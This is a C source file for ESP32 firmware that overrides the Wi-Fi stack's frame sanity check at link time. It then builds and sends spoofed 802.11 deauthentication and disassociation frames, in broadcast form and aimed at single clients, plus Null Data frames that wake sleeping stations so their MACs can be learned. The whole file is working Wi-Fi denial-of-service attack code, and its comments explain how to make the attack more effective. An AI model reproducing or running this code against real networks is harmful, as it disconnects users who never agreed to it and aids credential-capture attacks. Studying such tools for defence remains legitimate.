/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Overrides the Wi-Fi stack's frame sanity check at link time.
 *
 * Paired with -Wl,-zmuldefs in CMakeLists.txt, this same-name definition wins
 * over the one inside libnet80211 and makes the check always pass, so raw
 * deauthentication frames can be transmitted. This matches the upstream
 * ESP32-S2 build exactly, which is known to transmit successfully on this
 * target.
 *
 * @attention Not meant to be called directly.
 * @see Original idea https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

/* Exposed so the screen can show whether raw frames are actually accepted. */
static uint32_t raw_tx_ok = 0;
static uint32_t raw_tx_fail = 0;
static esp_err_t raw_tx_last_err = ESP_OK;

void wsl_bypasser_get_tx_stats(uint32_t *ok, uint32_t *fail, esp_err_t *last_err)
{
    if (ok != NULL) *ok = raw_tx_ok;
    if (fail != NULL) *fail = raw_tx_fail;
    if (last_err != NULL) *last_err = raw_tx_last_err;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (ret == ESP_OK) {
        raw_tx_ok++;
    } else {
        raw_tx_fail++;
        raw_tx_last_err = ret;
        ESP_LOGW(TAG, "Raw 802.11 transmit failed: %s", esp_err_to_name(ret));
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

/**
 * @brief Build a deauth/disassoc frame addressed to one station.
 *
 * Group-addressed deauth (DA = ff:ff:ff:ff:ff:ff) is discarded by many clients
 * ("not addressed to me"), which is why broadcast-only deauth often appears to
 * do nothing. Addressing the frame at the client's own MAC makes the client
 * process it.
 *
 * @param bssid    target AP, used as spoofed source and BSSID
 * @param sta      destination station MAC (NULL = broadcast)
 * @param reason   reason code (7 = class 3 frame from nonassociated STA)
 * @param disassoc true to send a disassociation frame (0xA0) instead of deauth
 */
void wsl_bypasser_send_deauth_to(const uint8_t *bssid, const uint8_t *sta,
                                 uint8_t reason, bool disassoc)
{
    if (bssid == NULL) return;

    uint8_t frame[sizeof(deauth_frame_default)];
    memcpy(frame, deauth_frame_default, sizeof(frame));
    frame[0] = disassoc ? 0xA0 : 0xC0;
    if (sta != NULL) memcpy(&frame[4], sta, 6);   /* DA: the client, or keep broadcast */
    memcpy(&frame[10], bssid, 6);                 /* SA: spoofed AP */
    memcpy(&frame[16], bssid, 6);                 /* BSSID */
    frame[24] = reason;
    frame[25] = 0x00;
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

/**
 * @brief Send a broadcast deauth/disassoc with an explicit reason code.
 */
void wsl_bypasser_send_deauth_broadcast(const uint8_t *bssid, uint8_t reason,
                                        bool disassoc)
{
    wsl_bypasser_send_deauth_to(bssid, NULL, reason, disassoc);
}

/**
 * @brief Wake sleeping stations with a Null Data frame that has More Data set.
 *
 * Stations in power save poll the AP for buffered frames; a Null Data frame
 * from the AP with MoreData=1 makes the station wake up and answer, which is
 * what lets the deauth path learn its MAC.
 */
void wsl_bypasser_send_null_wake(const uint8_t *bssid)
{
    if (bssid == NULL) return;

    uint8_t frame[24] = {
        0x48, 0x22, 0x00, 0x00,                          /* Null function, FromDS, MoreData */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,              /* DA: broadcast */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,              /* SA (filled below) */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,              /* BSSID (filled below) */
        0x00, 0x00                                       /* sequence control */
    };
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}
